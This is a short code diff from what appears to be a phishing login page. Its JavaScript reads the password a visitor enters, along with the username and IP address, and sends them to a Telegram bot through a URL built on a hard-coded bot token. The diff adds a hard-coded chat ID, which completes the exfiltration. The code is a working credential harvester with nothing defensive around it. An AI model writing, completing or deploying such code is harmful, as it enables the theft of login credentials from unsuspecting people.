@@ -157,7 +157,8 @@
                 const password = document.getElementById('password').value;
                 const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ipAddress}`;
 
-                                const token = '7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0'; // Replace with your bot token
+                const chatId = '6735326282'; // Replace with your chat ID
+                const token = '7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0'; // Replace with your bot token
 
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
 
